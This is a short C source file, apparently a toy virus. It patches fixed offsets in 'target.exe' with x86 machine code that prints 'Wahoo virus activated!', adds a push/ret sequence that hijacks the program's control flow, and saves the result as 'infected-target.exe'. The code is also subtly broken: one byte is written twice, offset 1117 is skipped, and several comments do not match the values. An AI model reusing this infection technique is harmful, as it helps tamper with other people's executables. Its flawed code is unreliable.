#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    // char * 7328 bytes = 7328 characters = 7328 ASCII characters
    char * buffer = (char *)malloc(sizeof(char) * 7328);
    // read target to edit
    FILE * target = fopen("target.exe", "r+b");

    fread(buffer, sizeof(char), 7328, target);

    // close files
    fclose(target);
    
    // mov eax, 4
    buffer[1102] = 0xb8;
    buffer[1103] = 0x04;
    buffer[1104] = 0x00;
    buffer[1105] = 0x00;
    buffer[1106] = 0x00;

    // mov ebx, 1
    buffer[1107] = 0xbb;
    buffer[1108] = 0x01;
    buffer[1109] = 0x00;
    buffer[1110] = 0x00;
    buffer[1111] = 0x00;

    // mov ecx 0x08048468
    buffer[1112] = 0xb9;
    buffer[1113] = 0x68;
    buffer[1114] = 0x84;
    buffer[1115] = 0x04;
    buffer[1116] = 0x08;

    // mov edx, 24
    buffer[1118] = 0xba;
    buffer[1118] = 0x17;
    buffer[1119] = 0x00;
    buffer[1120] = 0x00;
    buffer[1121] = 0x00;


    // syscall
    buffer[1122] = 0xcd;
    buffer[1123] = 0x80;

    // ret
    buffer[1124] = 0xc3;

    // Fill buffer with "Wahoo virus activated!" starting from offset 1128
    buffer[1128] = 0x57; // W
    buffer[1129] = 0x61; // a
    buffer[1130] = 0x68; // h
    buffer[1131] = 0x6f; // o
    buffer[1132] = 0x6f; // o
    buffer[1133] = 0x20; //  
    buffer[1134] = 0x76; // v
    buffer[1135] = 0x69; // i
    buffer[1136] = 0x72; // r
    buffer[1137] = 0x75; // u
    buffer[1138] = 0x73; // s
    buffer[1139] = 0x20; //  
    buffer[1140] = 0x61; // a
    buffer[1141] = 0x63; // c
    buffer[1142] = 0x74; // t
    buffer[1143] = 0x69; // i
    buffer[1144] = 0x76; // v
    buffer[1145] = 0x61; // a
    buffer[1146] = 0x74; // t
    buffer[1147] = 0x65; // e
    buffer[1148] = 0x64; // d
    buffer[1149] = 0x21; // !
    buffer[1150] = 0x0A; // new line
    buffer[1151] = 0x00; // null terminator

    // replace char 493 with push 0x0804844e in little endian
    buffer[1171] = 0x68;
    buffer[1172] = 0x4e;
    buffer[1173] = 0x84;
    buffer[1174] = 0x04;
    buffer[1175] = 0x08;
    buffer[1176] = 0xc3;

    // read infect to edit
    FILE * infect = fopen("infected-target.exe", "wb");
    // write to infect
    fwrite(buffer, sizeof(char), 7328, infect);

    fclose(infect);

    // free buffer
    free(buffer);

    return 0;
    
}